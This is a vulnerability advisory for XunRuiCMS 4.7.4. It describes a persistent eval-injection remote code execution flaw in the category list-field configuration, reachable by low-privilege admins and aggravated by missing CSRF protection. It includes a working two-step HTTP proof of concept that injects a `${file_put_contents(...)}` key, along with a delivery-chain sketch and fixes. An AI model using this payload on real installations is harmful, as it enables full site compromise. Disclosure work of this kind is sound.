# XunRuiCMS 4.7.4 — Persistent RCE via eval Injection in Category List-Field Configuration

- **Product**: XunRuiCMS (迅睿CMS) — vendor: dayrui / Sichuan Xunrui Cloud Software Co., Ltd. — https://www.xunruicms.com
- **Affected version**: 4.7.4 (latest release, `Version.php` updatetime 2026-10-23). Earlier versions are likely affected but were not individually verified.
- **Vulnerability type**: CWE-94 Code Injection (eval injection); aggravated by missing CSRF protection on the write endpoint (CWE-352)
- **CVSS 3.1**: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
- **Discoverer**: riyuedeqi
- **Status**: CVE requested via VulDB. Coordinated report submitted to CNVD (national CERT platform) on 2026-10-27. Vendor advisory page checked (45 entries) — no matching entry.
- **Testing disclaimer**: all PoCs below are marker-level (write a marker file / echo an md5 marker). No webshell, no weaponization. All tests were performed on a locally deployed instance of the official release package; all artifacts were removed afterwards.

## Summary

The admin feature "Shared Categories → list-field configuration" (`admin.php?c=category&m=config_add`) stores attacker-controlled **array keys** without any format validation, persists them verbatim into a PHP configuration file, and later renders them through a double-quoted `eval` string on every category-list page view. A key beginning with `${` executes arbitrary PHP expressions inside the double-quoted eval context. The injected key persists across restarts and cache refreshes, acting as a persistent backdoor.

## Root cause (4.7.4 official release package)

1. **No key validation at the entry point** — `dayrui/App/Cms/Extends/Admin/Category.php:390-392` (`config_add`): the whole POST `data` array is accepted via `post('data')`; the first-dimension keys of `list_field` (intended to be field names such as `title`, `thumb`) are never checked against a whitelist.

2. **Keys persisted without sanitization** — `dayrui/Fcms/Library/Config.php:78-93` (`to_require`): `var_export($data, TRUE)` is written to `cache/config/category.php`; keys and values both land verbatim in the generated PHP file. Contrast with `to_require_array()` (same file, lines 102-119) which passes keys through `_safe_replace()` — this is a filtering omission. The framework's `xss_clean` only sanitizes array values, never keys.

3. **Keys concatenated into the template string** — `Category.php:188-195`: for each enabled custom column, `$list .= '<td ...>$' . $i . '_html</td>'` embeds the raw key `$i` into the `$list` template.

4. **Double-quoted eval** — `Category.php:346-348`, executed for every category row on every render:

   ```php
   extract($t);
   $list = str_replace('"', '\'', $list);
   eval("\$nstr = \"$list\";");
   ```

   The hardcoded `$` prefix plus a key starting with `${` forms the PHP complex-interpolation syntax `${ expr }` inside the double-quoted string: the expression is evaluated. The `str_replace` quote-mangling does not help — the payload never needs to break out of the string.

## Reachability — not limited to super admins

The permission gate `_is_admin_auth()` (`dayrui/Fcms/Model/Auth.php:744-756`) maps the method `config_add` to action `add` and checks whether the role's granted URI list contains `category/add`. Granting the standard "Shared Categories" menu permission (`role&m=auth_edit` with `data[auth][category/index][]=add/edit/del`) expands to exactly that URI in the auth cache. Verified dynamically:

- **Control**: a zero-permission admin account is blocked at `config_add` ("no permission");
- **Test**: a role granted *only* category management completes the full injection chain end-to-end (marker file created, web-readable).

So any low-privileged admin holding the common "category manager" role can escalate to arbitrary code execution as the web server user (www-data).

Additionally, the write endpoint performs **no CSRF token validation** (installer default `SYS_CSRF='0'`, `Install.php:500`; the framework only applies its CSRF filter to the admin area at level `'2'` — `Filters.php`). A `SameSite=Lax` session cookie makes classical cross-site POST unreliable on modern browsers, so the practical primary vector is a low-privileged admin account; a secondary delivery chain exists via an unauthenticated callback-echo endpoint (`index.php?s=api&c=pay` / `c=buy` reaching the `dr_exit_msg` JSONP branch which echoes `$_GET['callback']` unfiltered, no special header required).

## PoC (marker-level)

**Step 1 — inject the payload key** (as a category-manager account; no CSRF token needed):

```
POST /admin.php?c=category&m=config_add
Cookie: <admin session>
Content-Type: application/x-www-form-urlencoded

data[list_field][${file_put_contents("v1_ok.txt","V1_RCE_OK_".md5("v1"))}][use]=1
&data[list_field][${file_put_contents("v1_ok.txt","V1_RCE_OK_".md5("v1"))}][name]=V1
```

Response: `{"code":1,"msg":"ok"}`. The key is written verbatim into `cache/config/category.php`:

```
'list_field' => array (
  '${file_put_contents("v1_ok.txt","V1_RCE_OK_".md5("v1"))}' => array ( 'use' => '1', 'name' => 'V1', ),
),
```

**Step 2 — trigger** (any visit to the category list page executes the injected expression):

```
GET /admin.php?c=category&m=index
```

Server-side result: `/v1_ok.txt` appears in the web root with content
`V1_RCE_OK_6654c734ccab8f440ff0825eb443dc7f` (= `md5("v1")`, independently verified) and is retrievable via `GET /v1_ok.txt` (HTTP 200), confirming execution in the web process context.

## Impact

1. Any admin account with the standard category-management permission can inject a persistent eval expression → arbitrary code execution with www-data privileges: database credentials in `config/database.php` readable, arbitrary file read/write within web-writable paths, full site compromise (horizontal privilege escalation);
2. The injected key is persistent — executed on every category-list render, survives restarts and cache refreshes (backdoor characteristics);
3. Combined with the missing CSRF protection and the unauthenticated callback-echo endpoint, an unauthenticated external attacker can construct a delivery chain ("victim admin clicks a link → same-origin auto-POST → RCE on next admin page visit").

## Remediation

1. **Key whitelist**: validate `list_field` first-dimension keys against `^[a-z0-9_]+$` in `config_add`;
2. **Sanitize on persist**: apply `_safe_replace()` to keys in `Config::to_require` (as `to_require_array` already does);
3. **Remove the eval**: render the category list with a pre-registered variable map instead of double-quoted string `eval`;
4. **CSRF default**: change installer default `SYS_CSRF` from `'0'` to `'2'` (note: at `'1'` the framework exempts the admin area, so `'1'` does NOT protect the backend);
5. Add a `^[A-Za-z0-9_.]+$` whitelist to the `callback` parameter in `dr_exit_msg` / `dr_show_error`.

## Disclosure timeline

- **2026-10-27** — vulnerability confirmed end-to-end (including low-privilege verification and control test) on 4.7.4, the latest official release;
- **2026-10-27** — coordinated report submitted to CNVD (national CERT platform, under vendor coordination);
- **2026-10-27** — public advisory published on GitHub; submitted to VulDB for CVE assignment.

*The vendor has been informed through the CNVD coordination process. This advisory will be updated with the CVE ID once assigned.*
